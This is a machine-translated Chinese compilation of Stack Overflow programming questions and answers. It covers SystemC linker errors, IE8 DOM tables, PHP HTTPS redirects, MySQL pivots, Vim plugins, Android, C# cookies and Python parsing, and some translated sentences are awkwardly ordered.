我是 SystemC 的新手，我只是使用[本](http://www.ict.kth.se/courses/IL2452/Sept2009/TUTORIAL-SystemC-with-Microsoft-Visual-Studio.pdf)教程编译了它，以便在 VS2010 中使用它。但是当我尝试调试以下程序时：

```
#include <systemc.h>

SC_MODULE (systemcTest) {
SC_CTOR (systemcTest) {

}
void say_hello() {
    cout << "Hello World.\n";
}
};
int sc_main(int argc, char* argv[]) {
systemcTest hello("HELLO");
hello.say_hello();
return(0);
} 
```

我收到了类似于以下错误的 51 个错误：

```
error LNK2005: "public: void __thiscall std::basic_ios<char,struct std::char_traits<char> >::setstate(int,bool)" (?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QAEXH_N@Z) already defined in SystemC.lib(sc_simcontext.obj) \msvcprtd.lib(MSVCP100D.dll) 
```

大多数与 msvcprtd.lib、libcmtd.lib 有关。如何解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-10-11T20:04:45.563

这主要与用于编译 SystemC 库 (SystemC.lib) 和您的 SystemC 项目的项目的不同 MS 运行时库有关。使用 MS 编译器，有 4 个不同的运行时库：

*   多线程 (/MT) --> LIBCMT.lib
*   多线程调试 (/MTd) --> LIBCMTD.lib
*   多线程 DLL (/MD) --> MSVCRT.lib,MSVCPRT.lib + MSVCR100.DLL,MSVCP100.DLL
*   多线程调试 DLL (/MDd) --> MSVCRTD.lib,MSVCPRTD.lib + MSVCR100D.DLL,MSVCP100D.DLL

您似乎使用 /MDd 来编译 SystemC.lib，但您使用 /MTd 来编译 SystemC 项目。你可以纠正它：

从属性页中选择配置属性 ==> C/C++ ==> 代码生成 ==> 运行时库 ==> 多线程调试 DLL (/MDd)。

可以在此处找到类似的线程：[Visual C++ 中多个项目之间的链接器错误](https://stackoverflow.com/questions/604484/linker-errors-between-multiple-projects-in-visual-c)

# javascript - document.createElement 不适用于 IE 8 及更低版本

> ID：15510625
> 
> 赞同：0
> 
> 时间：2013-03-19T21:17:36.550
> 
> 标签：javascript, html

我有这个让用户上传图片。我想将图片的数量限制为 4。起初它只显示一个输入字段，然后如果用户想要添加更多，他们可以单击 Button-Add-icon.png 并出现另一个输入字段。当他们达到四个输入并决定删除一个时，他们单击 Button-Delete-icon.png。

整个过程在 Firefox、Chrome、Seamonkey 和 IE9 上运行良好。但它不适用于 IE8、IE7 及之前的版本。有人可以提示如何修复它吗？

谢谢

```
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org 
 /TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml">
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
 <title>Document sans titre</title>

 <script type="text/javascript">
   var totalItems = 0;
   function addItems()
 {
   if(totalItems < 3) 
  {
  var table1 = document.getElementById('tab1');
  var newrow = document.createElement("tr");
  var newcol = document.createElement("td");
  var input = document.createElement("input");
  input.type="file";
  input.name="image[]";
  newcol.appendChild(input);
  newrow.appendChild(newcol);
  table1.appendChild(newrow);
  totalItems++;
  } else {
    //Display your message here.. 
         }
 }

  function remItems()
{
var table1 = document.getElementById('tab1');
var lastRow = table1.rows.length;
if(lastRow>=2) 
 {
 table1.deleteRow(lastRow-1);
 totalItems--; 
 }
}

 </script>
 </head>

 <body>

 <table align="center" border="0" id="tab1" >
  <tr>
   <td width="218" align="center"><input type="file" name="image[]" /></td>
      <td width="54" align="center"><img src="images/Button-Add-icon.png"  
      style="cursor:pointer" onclick="addItems()" />
      </td>
   <td><img src="images/Button-Delete-icon.png"  style="cursor:pointer" 
    onclick="remItems()" />
   </td>
  </tr>
 </table>

  <table align="center" border="0" id="tab2">
  </table>

 </body>
 </html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T21:55:01.273

您正在将该行作为子元素添加到错误的元素中。

HTML 表格总是有一个`tbody`元素作为子元素，所有`tr`元素都在里面。如果您编写的 HTML 包含一个没有`tbody`元素的表格，它将自动创建，但是稍后更改表格时，您必须考虑该`tbody`元素。

一个简单的解决方法是显式地编写元素，给它一个 id，然后在元素中而不是在元素中`tbody`插入新行。`tbody``table`

```
<table>
    <tbody id="tb1">
        <tr><td></td></tr>
    </tbody>
</table> 
```

# php - 如果页面是 PHP 重定向到 HTTPS

> ID：15510629
> 
> 赞同：-1
> 
> 时间：2013-03-19T21:17:41.620
> 
> 标签：php

我需要一个 PHP if/else 语句，如果 sign-in.php 或 register.php 页面是通过 HTTP 访问的，我想重定向到 HTTPS，否则如果通过 HTTPS 访问任何其他页面，则重定向到 HTTP 并附加任何查询字符串例如，如果用户尝试访问受限页面 ( [http://domain.com/my-account.php](http://domain.com/my-account.php) )，该站点会将用户重定向到[http://domain.com/sign-in.php?redirect=my- account](http://domain.com/sign-in.php?redirect=my-account)但是，我希望页面重定向到[https://domain.com/sign-in.php?redirect=my-account](https://domain.com/sign-in.php?redirect=my-account)。

我知道我可以简单地将标头重定向更改为包含 https 而不是 http 但用户可以键入[http://domain.com/sign-in.php?redirect=my-account](http://domain.com/sign-in.php?redirect=my-account)所以只需要确保这是否发生登录（或其他）发生在https上。

任何帮助表示赞赏

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-19T21:19:23.297

干得好。

```
//force the page to use ssl 
if ($_SERVER["SERVER_PORT"] != 443) {
    $redir = "Location: https://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'];
    header($redir);
    exit();
} 
```

[$_SERVER](http://php.net/manual/en/reserved.variables.server.php)，它是一个包含标题、路径和脚本位置等信息的数组。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-19T21:18:57.473

您可以检查 $_SERVER，特别是“SERVER_PROTOCOL”

[http://php.net/manual/en/reserved.variables.server.php](http://php.net/manual/en/reserved.variables.server.php)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-19T21:31:27.370

应该有一部分代码始终在每个页面上运行。在 MVC 中，它将位于您的基本控制器中。其他设计可能在每个页面上都包含一个 init.php 文件。

在这个文件中有一个需要 HTTPS 的页面的白名单。

```
$requires_https = array(
    'sign-in.php' => TRUE,
    'register.php' => TRUE
); 
```

然后您需要确定请求了哪个页面。

```
$url_info = pathinfo($_SERVER['REQUEST_URI']);
$page = $url_info['filename']; 
```

接下来检查您使用的是 HTTP 还是 HTTPS

```
$is_secure = ! empty($_SERVER['HTTPS']); 
```

最后，您可以进行检查：

```
if (isset($requires_https[$page]) AND ! $is_secure)
    header('Location: https://www.yoursite.com/' . $page);
elseif ( ! isset($requires_https[$page]) AND $is_secure)
    header('Location: http://www.yoursite.com/' . $page); 
```

这绝对可以在最后一部分通过使用自定义重定向函数和 site_url 函数来改进，该函数接受安全与否的选项并构建正确的 URL。

值得一提的是，如果有人留在 HTTPS 中冲浪，这通常无关紧要。事实上，谷歌的大部分服务都是使用 HTTPS 的，并且随着互联网连接的改善，冲浪最终将全部使用 HTTPS。重要的是确保应该安全的页面是安全的，而不是确保不需要安全的页面不安全。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-12-02T09:59:30.740

```
if ($_SERVER['SERVER_PORT'] != 443) {
   header("HTTP/1.1 301 Moved Permanently");
   header("Location: https://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);
   exit();
} 
```

使用 init 类/脚本的一部分 - 您可以运行代码来检查此页面是否需要 SSL，但这是强制重定向到 SSL 的实际代码（并且 REQUEST_URI 提供任何目录等以获取正确的路径） .

在单个页面上使用（即登录和注册） - 这会将用户重定向到 SSL 中的此页面（将此代码放在顶部附近）。

301 永久移动也将防止任何负面的 SEO。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-12-05T19:04:02.587

（一更）完整方法：（包括查询字符串）

要确定是否在 https 上：

```
$secure = (!empty(filter_input(INPUT_SERVER, 'HTTPS')) &&
  filter_input(INPUT_SERVER, 'HTTPS') !== 'off') ||
  filter_input(INPUT_SERVER, 'SERVER_PORT') == 443; 
```

根据[https://stackoverflow.com/a/2886224](https://stackoverflow.com/a/2886224)

然后重定向并包含查询字符串：

```
if($secure){
  header("Location: https://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);
} 
```

使用`REQUEST_URI`而不是`PHP_SELF`将包括查询参数（`?`在 URL 之后的东西）。

并且一如既往地使用`filter_input()`或类似过滤您的用户输入（包括这些）。

# java - 如何找出哪个进程正在使用Java中的文件？

> ID：15510630
> 
> 赞同：2
> 
> 时间：2013-03-19T21:17:50.547
> 
> 标签：java, file, process, move

我试图在 Java 中将文件从一个目录移动到另一个目录，但我收到以下错误消息“该进程无法访问该文件，因为它正被另一个进程使用。”

如何在 Java 中找出哪个进程正在使用该文件？

我在Win 7上。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T21:23:17.013

如果命令行方法是可行的，并且您在类似 Linux 的系统上，那么[`lsof`](http://linux.die.net/man/8/lsof)就是您的朋友。大约有 10 个 gazillion 标志`lsof`，但根据您的需要，它应该很简单：

```
lsof myfile 
```

您应该得到类似于以下内容的输出：

```
COMMAND    PID    USER  FD   TYPE DEVICE  SIZE    NODE NAME
someprog   4660 foobar mem    REG  253,0 58400 4522314 myfile 
```

**编辑**

你说你正在使用Windows。我不熟悉 Windows 命令行工具。但是，这里有一个问题可能会有所帮助：*[如何确定特定文件是否在 Windows 中打开？](https://stackoverflow.com/questions/15708/lsof-equivalent-for-windows)*.

# twitter-bootstrap - 有什么方法可以使 Bootstrap 模态适合窗口大小？

> ID：15510634
> 
> 赞同：3
> 
> 时间：2013-03-19T21:17:57.573
> 
> 标签：twitter-bootstrap

我正在使用 Bootstrap 2.3 构建一个站点，并将模态函数用作我的图像的灯箱。

反正有没有使模态适合用户屏幕的高度？

提前致谢。

# ruby - Ruby ffi 结构的值取决于其他结构的大小

> ID：15510635
> 
> 赞同：1
> 
> 时间：2013-03-19T21:17:59.280
> 
> 标签：ruby, ffi

我正在使用 FFI gem 转换 C 库。

其中一个结构具有一个属性，具体取决于另一个结构的大小。

```
class MipInterface < FFI::Struct
  layout(
         :state, :uchar,
         :port_handle, :pointer,
         :input_buffer, RingBuffer,
         :input_buffer_bytes, a(MipHeader.size+255+2).u8
  )
end 
```

我不知道如何将`a(MipHeader.size+255+2).u8`零件转换为 ruby​​ 和 ffi 可以理解的东西。

错误是：

```
NoMethodError: undefined method `a' for MipSdk::MipInterface:Class 
```

如果我改为：

```
:input_buffer_bytes, MipHeader.size+255+2 
```

然后我有这个错误：

```
TypeError: unable to resolve type '261' 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T22:54:42.823

a() 很可能是一个 C 函数，它返回一个具有 u8 属性的结构。该 u8 属性可能是一种类型，如果幸运的话，它可能是固定的 - 从名称上看，它看起来很像 char * 缓冲区，并且因为 u8 可能意味着“无符号 8 位整数”或`:uchar`

所以一个 261 字节的 :uchar 数组可能是合适的（抱歉不知道 ffi）* - 取决于 MipHeader.size 是否在不同的系统或配置中有所不同。

我*想*你想要的是

```
class MipInterface < FFI::Struct
  layout(
         :state, :uchar,
         :port_handle, :pointer,
         :input_buffer, RingBuffer,
         :input_buffer_bytes, [:uint8, MipHeader.size+255+2]
  )
end 
```

我还猜测`a(i).foo`是一些 C 便利包装器，用于“声明我一个数组长度 i 类型为 'foo'”。

# mysql - MYSQL 显示大于 0 的值

> ID：15510643
> 
> 赞同：-1
> 
> 时间：2013-03-19T21:18:42.507
> 
> 标签：mysql, join

我正在尝试从中获取数据，`awards_bookings_table`但由于某种原因，我在下面的行中遇到了错误，我 100% 确定它与我编码的内容：)

**目标：**

我只想拉出表的结果：大于的`awards_booking_tickets`列`ticket_quantity``0`

**主要加盟：**

```
`LEFT JOIN `awards_bookings_tickets` bookings_tickets ON bookings.awards_booking_id = bookings_tickets.booking_id` 
```

**问题代码：**

我试图做以下事情：

```
LEFT JOIN `awards_bookings_tickets` bookings_tickets ON bookings.awards_booking_id = bookings_tickets.booking_id WHERE booking_tickets.ticket_quantity > 0 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T21:20:19.827

只需用于`AND`组合子句，即：

```
 INNER JOIN `awards_bookings_tickets` bookings_tickets ON bookings.awards_booking_id = bookings_tickets.booking_id AND booking_tickets.ticket_quantity > 0 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-19T21:21:45.973

你试过用`WHERE`吗？

```
 WHERE booking_tickets.ticket_quantity > 0 
```

# vim - vi plugin - Stab - 用空格替换常规选项卡，捆绑为插件和自动启动

> ID：15510646
> 
> 赞同：0
> 
> 时间：2013-03-19T21:18:58.433
> 
> 标签：vim, plugins, vi, indentation

长期以来，我一直在寻找一个好的缩进插件，最近我发现： [https](https://stackoverflow.com/a/1610732/2034967) ://stackoverflow.com/a/1610732/2034967 这是一个很棒的缩进（我个人认为最好的），我永久使用它 -我`.vimrc`文件的一部分，每次我启动 vi 时我都会打开它，如果没有，那么我使用 :retab`\t`在打开后修复选项卡`:Stab`。

我的实际问题是如何将它变成一个单独的捆绑包并将其配置为自动启动所需的（使用 4 个空格而不是制表符）参数配置自动并且仅禁用（关闭并返回默认选项卡）插件按需使用`:Stab`？

关于我的工作环境的背景：在命令行中运行在 linux 上的 vim（主要是 MCP linux 发行版）（不是 GUI vim）

我之所以问它是因为我尝试按照 vim 指南创建插件但失败了。我尝试了一些 vim 插件来管理像 [https://github.com/tpope/vim-pathogen](https://github.com/tpope/vim-pathogen)这样的插件 ，但没有成功。

谢谢您的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T09:07:00.503

如果没有 Pathogen，你的单文件脚本应该放在这里：

```
~/.vim/plugin/stab.vim 
```

使用 Pathogen 或 Vundle，您应该像这样安装它：

```
~/.vim/bundle/stab/plugin/stab.vim 
```

由于 Vim 加载插件的方式，执行`Stab`时命令将不可用`~/.vimrc`，但是，由于它的交互性，我不确定`Stab`每次启动 Vim 时执行命令是否是个好主意。

但是，可以对其进行修改，使其能够以非交互方式运行，例如使用全局变量或自动加载……但在这一点上，它的工作方式与您的相关选项*听起来*`~/.vimrc`不一样对我来说很实用。而且比较浪费。

无论如何，以下（快速）版本可以从您的`~/.vimrc`. `:Stab`如果您想以交互方式执行它，您仍然可以使用它。

为此，您必须在此处安装脚本：

```
~/.vim/autoload/stab.vim 
```

并将这一行添加到您的`~/.vimrc`：

```
call stab#stab(4, 1) 
```

第一个参数是你想要`shiftwidth`的，第二个参数是一个布尔值：`0`如果你不想`expandtab`，`1`如果你想要`expandtab`。确保这一行出现*在*任何缩进设置之后。

修改后的脚本：

```
if exists("g:loaded_stab") || &cp
  finish
endif
let g:loaded_stab = 1

command! -nargs=* Stab call stab#stab(<f-args>)

function! stab#stab(...)

  if a:0 > 0
    let l:tabstop = 1 * a:1
  else
    let l:tabstop = 1 * input('set shiftwidth=')
  endif

  if l:tabstop > 0
    " do we want expandtab as well?
    if a:0 > 1
      let l:expandtab = a:2
    else
      let l:expandtab = confirm('set expandtab?', "&Yes\n&No\n&Cancel")
    endif
    if l:expandtab == 3
      " abort?
      return
    endif

    let &l:sts = l:tabstop
    let &l:ts = l:tabstop
    let &l:sw = l:tabstop

    if l:expandtab == 1
      setlocal expandtab
    else
      setlocal noexpandtab
    endif
  endif

  " show the selected options
  try
    echohl ModeMsg
    echon 'set tabstop='
    echohl Question
    echon &l:ts
    echohl ModeMsg
    echon ' shiftwidth='
    echohl Question
    echon &l:sw
    echohl ModeMsg
    echon ' sts='
    echohl Question
    echon &l:sts . ' ' . (&l:et ? '  ' : 'no')
    echohl ModeMsg
    echon 'expandtab'
  finally
    echohl None
  endtry
endfunction 
```

# android - Android 序列化 - 这将适用于对象的整个实例吗？

> ID：15510648
> 
> 赞同：0
> 
> 时间：2013-03-19T21:19:07.560
> 
> 标签：android, serialization

我对上一个问题的回答： [https](https://stackoverflow.com/questions/15489956/sending-data-structure-through-byte-android) ://stackoverflow.com/questions/15489956/sending-data-structure-through-byte-android 指出我应该研究序列化以将我的数据转换为字节数组以便通过传输蓝牙。

我一直在研究它，但找不到任何明确的答案来说明我是否能够传输一个对象的整个实例，我原本想发送几个数组，但现在我想也许我可以创建一个对象：

“测试”参数：

测试名称 - 字符串

问题 - 字符串数组

问题答案 - 字符串数组

正确答案 - 整数数组

我的编程不是那么好，所以我想知道，我可以创建这个类，让一个设备上的用户构造一个对象，然后通过序列化传递那个对象本身（如[Java Serializable Object to Byte Array](https://stackoverflow.com/questions/2836646/java-serializable-object-to-byte-array)所示）

这真的会完全工作并在另一个系统上给我一个完整的对象，我可以从中访问我需要的数据元素吗？

对不起，如果这是一个愚蠢的问题，但正如我之前所说，我的编程不是那么好，所以我有时会感到困惑:(

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T21:45:01.453

> 我可以创建这个类，让一个设备上的用户构造一个对象，然后通过序列化传递那个对象本身吗

简短的回答：是的

但是不要忘记类必须实现 Serializable 接口，否则会抛出**NotSerializableException 。**

> 这真的会完全工作并在另一个系统上给我一个完整的对象，我可以从中访问我需要的数据元素吗？

是的，但是这个“其他系统”必须知道这个类。所以如果你创建类

```
public class Foo implements Serializable {

   private String name;
   private int age;

   // getters and setters
} 
```

想要反序列化对象的应用程序，必须在构建路径中有这个类，简单地说。

# c# - 如何在 HttpWebRequest 中获取由“Set-Cookie”设置的 cookie？

> ID：15510655
> 
> 赞同：0
> 
> 时间：2013-03-19T21:19:42.013
> 
> 标签：c#, httpwebrequest, httprequest, httpresponse, httpwebresponse

我希望下面的代码会产生一个非零值：

```
var webRequest = (HttpWebRequest) WebRequest.Create(loginUrl);
var webResponse = (HttpWebResponse)webRequest.GetResponse();
Console.WriteLine(webResponse.Cookies.Count); 
```

但似乎没有 cookie 出现在`webRespone.Cookies`. 我很肯定 cookie 就在那里，因为我正在用 Fiddler 嗅探数据。这是我得到的回应：

```
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/7.5
Set-Cookie: __Abc=Def; path=/; HttpOnly
PS-ResponseTime: 00:00:00.0624001
PS-Build: 2013-03-19-11-36-59
PS-Node: 02
Date: Tue, 19 Mar 2013 21:14:51 GMT
Content-Length: 57872 
```

它与cookie的事实有什么关系`HttpOnly`吗？

## 编辑

看来我可以让他们通过`HttpWebRequest`'s`CookieContainer`如果我打算继续进行一系列请求/响应，这肯定很有用。但是为什么我不能通过该`HttpWebResponse.Cookies`字段访问它们呢？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T23:46:48.260

没错，您需要将请求传递给 CookieContainer 的实例，然后引用该实例以查看 cookie。基本上，HttpWebResponse 不会直接在响应中公开标记为 HttpOnly 的 cookie。

# mysql - 使用 MySQL 的数据透视表

> ID：15510657
> 
> 赞同：2
> 
> 时间：2013-03-19T21:19:44.753
> 
> 标签：mysql, sql, pivot

我有两张桌子 Triples 和 Tags

三元组表具有以下列

```
 id  PostID  TagID   Value
   1   1        1     Murder
   2   1        2     New Brunswick
   3   2        1     Theft
   4   2        3     Gun 
```

标签表具有以下列

```
 id   TagName
   1   Incident
   2   Location
   3   Weapon 
```

我正在尝试编写 sql 来创建带有动态标题的数据透视表

输出应该是这样的

```
 PostID  Incident   Location         Weapon        
           1   Murder     New Brunswick    
           2   Theft                        Gun 
```

任何编写 SQL 的帮助将不胜感激。我在网上看到过例子，但无法弄清楚这个

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-03-19T21:28:57.290

为了在 MySQL 中*透视*数据，您需要同时使用聚合函数和`CASE`表达式。

如果您有已知数量的列，则可以对查询进行硬编码：

```
select p.postid,
  max(case when t.tagname = 'Incident' then p.value end) Incident,
  max(case when t.tagname = 'Location' then p.value end) Location,
  max(case when t.tagname = 'Weapon' then p.value end) Weapon
from triples p
left join tags t
  on p.tagid = t.id
group by p.postid; 
```

请参阅[带有演示的 SQL Fiddle](http://sqlfiddle.com/#!2/d020b/2)

但是如果你有一个未知数量的列，那么你将需要使用准备好的语句来生成动态 SQL：

```
SET @sql = NULL;
SELECT
  GROUP_CONCAT(DISTINCT
    CONCAT(
      'max(CASE WHEN TagName = ''',
      TagName,
      ''' THEN p.value END) AS `',
      TagName, '`'
    )
  ) INTO @sql
FROM tags;

SET @sql 
  = CONCAT('SELECT p.postid, ', @sql, ' 
           from triples p
           left join tags t
             on p.tagid = t.id
           group by p.postid');

PREPARE stmt FROM @sql;
EXECUTE stmt;
DEALLOCATE PREPARE stmt; 
```

请参阅[SQL Fiddle with Demo](http://sqlfiddle.com/#!2/d020b/4)。

两者都会给出结果：

```
| POSTID | INCIDENT |      LOCATION | WEAPON |
----------------------------------------------
|      1 |   Murder | New Brunswick | (null) |
|      2 |    Theft |        (null) |    Gun | 
```

# yield - 为什么要在事件循环中产生？

> ID：15510663
> 
> 赞同：0
> 
> 时间：2013-03-19T21:20:05.970
> 
> 标签：yield, event-loop

我使用了一个 C++ 框架，其中每个循环周期结束时的 yield 是强制性的。现在我从 C# 和 C++/CLI 开始，我也遇到了 yield 函数。我正在创建一个事件循环，并且想知道是否有必要使用 yield。我不是在创建一个帧速率很重要的游戏，我要追求最高性能（速度）。

```
function main
{
    initialize
    loop(!quit){
        update input
        update application
        render
        yield
    }
    terminate
} 
```

平台是否不能在不同的应用程序之间正确划分运行时间，因此我应该使用 yield 吗？

如果是，我应该这样做多长时间，使用线程睡眠不是更好吗，所以优先级较低的线程也可以获得一些额外的时间？

也感谢有关 .NET 的其他语言的答案。我只是好奇 yield 的一般目的是否真的有必要。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-04-30T10:02:39.490

据我了解，此处使用的产量与 sleep(0.00...01) 相同。它告诉调度程序你现在不需要做更多的工作。

平台能够划分时间，但它不知道（没有你告诉它）什么时候最好中断一个线程。

因此，在不产生进程/线程的情况下，调度程序可能会使您的线程立即执行 29 次循环，这是多余的，因为可能没有新的输入。然后你一秒钟都不会再打一轮。最好屈服于做多余的工作，这样你就可以在重要的时候更快地恢复工作。

另一个原因是当你在中间时调度器很有可能暂停你的循环，这意味着渲染会延迟。最后产生意味着，如果调度程序打算为您的线程/进程提供比一个循环平均花费更多的时间，那么您不太可能让线程/进程在循环中间暂停。

# android - 完成（）不工作

> ID：15510666
> 
> 赞同：2
> 
> 时间：2013-03-19T21:20:35.157
> 
> 标签：android, android-activity

我的应用程序有一个相当奇怪的行为。我在 BOOT_COMPLETE 之后启动我的应用程序，因此在我启动设备后它是可见的。GUI 反应灵敏，一切正常，直到我调用finish()，当按下按钮时，什么也没有发生。GUI 仍然有响应，并且没有产生 ANR 或可疑的 logcat 消息，所以我没有任何提示。

到目前为止，我尝试过：

*   附加调试器并跟踪调用，但我找不到任何东西
*   我检查了活动的运行实例（使用eclipse内存分析器），内存中只有一个
*   我暂停了发射，几秒钟后完成（）工作正常（这是我目前的解决方法）

不幸的是，没有有用的代码可以发布来演示这个问题，因为在以后的任何时间点启动 Activity 时，一切都运行良好。

任何想法如何解决这个问题？

我在三星设备上运行 Android 2.1，我在 HTC Desire 上的 Android 2.2 上对其进行了测试，但这个错误在 Nexus 4 上没有发生，也没有在模拟器上发生，也许它是特定于设备/版本的。

**编辑** 这是活动清单条目

```
<activity
            android:name=".activity.MyActivity"
            android:enabled="false"
            android:excludeFromRecents="true"
            android:exported="false"
            android:immersive="true"
            android:launchMode="singleInstance"

             >
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.HOME" />
            </intent-filter>
        </activity> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-21T11:59:17.450

为什么您的活动被禁用？来自 Android 文档：

> android:enabled - 系统是否可以实例化活动 - 如果可以，则为“true”，否则为“false”。默认值是true”。

这可能会使系统感到困惑，当您调用完成时，它只看到 Activity 已禁用，请尝试将其设为 true。

# python - 将具有多个列表/数组的一个字符串转换为单独的列表

> ID：15510668
> 
> 赞同：0
> 
> 时间：2013-03-19T21:21:04.967
> 
> 标签：python, xml, elementtree, plaintext

标题太可怕了。这就是我的意思。我正在使用 Wolfram|Alpha 的 API。在解析它时，我得到了这些可怕的字符串，就像这样（通过查询“蜘蛛侠”）：

> “年 | 标题 | 中等 1962 | 神奇幻想 #15 | 漫画书 1967 | 蜘蛛侠 | 动画 > 1977 | 超凡蜘蛛侠 | 电视 1978 | Questprobe #2 蜘蛛侠 | 电子游戏 2002 > | 蜘蛛侠 |电影”

这实际上是应该是这样的列表的字符串表示形式（）：

> [年份、标题、媒介]
> 
> [1962，惊人的幻想 #15，漫画书]
> 
> [1967，蜘蛛侠，电子游戏]
> 
> [2002，蜘蛛侠，电影]

我可以轻松地将其拆分为一个大列表……但我想不出一种简单的方法将它们按应有的方式放入列表中（如上所示）。除了转换为大列表、解析列表、通过创建一个新列表将它们分成列表列表之外的任何建议我遍历的每第三个项目......？

我的想法（很长的路要走）：

```
listA = list()
listA = textRepresentation.split("|")
listB = list()
listC = list()
i = 1
for item in listA:
  if(i == 3):
    listB.append(listC)
    i = 1
  else:
    listC.append(item)
    i++ 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T21:36:23.033

```
import re
zip(*[(i.strip() for i in re.split('(\d{4})|\||>', text) if i and i.strip())]*3) 
```

出去：

```
[('year', 'title', 'medium'),
 ('1962', 'Amazing Fantasy #15', 'comic book'),
 ('1967', 'Spider-Man', 'animation'),
 ('1977', 'The Amazing Spider-Man', 'television'),
 ('1978', 'Questprobe #2 Spider-Man', 'video game'),
 ('2002', 'Spider-Man', 'movie')] 
```

# android - 向 Google 地图片段添加标记

> ID：15510669
> 
> 赞同：1
> 
> 时间：2013-03-19T21:21:08.067
> 
> 标签：android, google-maps-api-2, mapfragment

我在我的应用程序中添加了一个地图片段，并添加了以下代码以在片段上放置一个标记。但我在代码片段中遇到了错误。我已经包含了所有相关的导入。

错误是编译时的，如下所示：

1.MapFragment 无法解析为类型。

2.GoogleMap 无法解析为类型。

3.LatLng 无法解析为类型。

```
mMap = ((MapFragment) getFragmentManager().findFragmentById(R.id.map)).getMap();
        mMap.addMarker(new MarkerOptions()
                .position(new LatLng(0, 0))
                .title("Hello world")); 
```

任何人都知道代码段中的错误在哪里？谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-19T21:36:45.070

I think you should check two things first

1.  Is the Google Play Service project or library added to your project ? If not, check this link [http://developer.android.com/google/play-services/setup.html](http://developer.android.com/google/play-services/setup.html)
2.  If you compile for android version < 11, you need to use supportFragmentManager instead of the normal FragmentManager :

    ```
     mMap = ((SupportMapFragment) getSupportFragmentManager().findFragmentById(R.id.map)).getMap(); 
    ```

In the last case, you also need to update the class used in your XML to `class="com.google.android.gms.maps.SupportMapFragment"`

# php - 显示排序数据

> ID：15510670
> 
> 赞同：1
> 
> 时间：2013-03-19T21:21:16.227
> 
> 标签：php, html, sorting

我在尝试正确格式化我的数据时遇到了问题。

首先，我的 PHP 代码如下所示（请参阅[JSFiddle](http://jsfiddle.net/for3v3rforgott3n/Q63Dx/5/)进行演示）：

```
$result_rules = $db->query("SELECT rules.source_id, rules.destination_id, dest.project AS dest_project, src.project AS src_project, src.pk_id AS src_id, excep.project AS excep_project, excep.feature AS excep_feature, excep.milestone AS excep_milestone
    FROM dbo.FFC_Rules rules
    INNER JOIN dbo.Destination dest
        ON dest.pk_id=rules.destination_id
    LEFT JOIN dbo.Source src
        ON src.pk_id=rules.source_id
    LEFT JOIN dbo.Exceptions excep
        ON src.pk_id=excep.source_id
    ORDER BY dest.project ASC");

$last_src = false;
$last_dest = false;
while($row = sqlsrv_fetch_array($result_rules)){  
    if ($row['dest_project'] !== $last_dest) {
        if ($last_dest !== false)
            echo "</div>";
        $last_dest = $row['dest_project'];
        echo "<div class='projectscontainer'>";
        echo    "<div id='arrow' class='arrow-right'></div>";
        echo    "<span class='item destproject unselectable' title='ID: $row[destination_id]'>$row[dest_project]</span>";
        echo    "<br>";
    }

    echo        "<div class='srcprojects'>";
    if (is_null($row['src_id'])) {
        echo        " Source ID for Destination ID $row[destination_id] is NULL";
    } else {
        if($row['src_project'] !== $last_src) {
            $last_src = $row['src_project'];
            echo    "<span class='item srcproject' title='ID: $row[src_id]'>$row[src_project]</span>";
            if (!is_null($row['excep_feature']))
                echo"<div id='arrow' class='arrow-right'></div><span class='item srcproject exception' title='Feature'>$row[excep_feature]</span>";
            if (!is_null($row['excep_milestone']))
                echo"<div id='arrow' class='arrow-right'></div><span class='item srcproject exception' title='Milestone'>$row[excep_milestone]</span>";
            echo    "<br>";
        }
    }
    echo        "</div>";//end srcprojects
}
echo        "</div>";//end projectscontainer 
```

在我的查询中，我按 Destination 项目排序，并在我的 PHP 代码中检查当前 dest 是否与上一个相同。如果是这样，我不显示名称。我想对 Source 项目做同样的事情，但由于查询是按 Destination 项目排序的，因此重复出现在不同的地方，并且不会被我的 PHP 代码捕获。

如何在不必再次获取查询返回的所有 40,000 多行的情况下完成此操作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T21:26:23.697

您必须在另一个中排序，如下所示：

ORDER BY dest.project ASC, src.project ASC

并使用 LIMIT 子句来说明您希望从查询中获得多少行。

# javascript - Meteor：在 Todos 示例中创建新屏幕

> ID：15510671
> 
> 赞同：0
> 
> 时间：2013-03-19T21:21:17.910
> 
> 标签：javascript, meteor

我正在使用 Meteor 框架中的 todos 示例。哪些 API 方法呈现新页面？例如，如果我单击记录的链接，它应该在主框架内呈现一个新页面。我知道 SPA 是 Meteor 的想法，所以我不确定我是否使用了最好的方法。

本质上，我想要的是一种让用户从行表中导航到记录中并查看所有相关数据的方法。

* * *

## 回答 #1

> 赞同：2
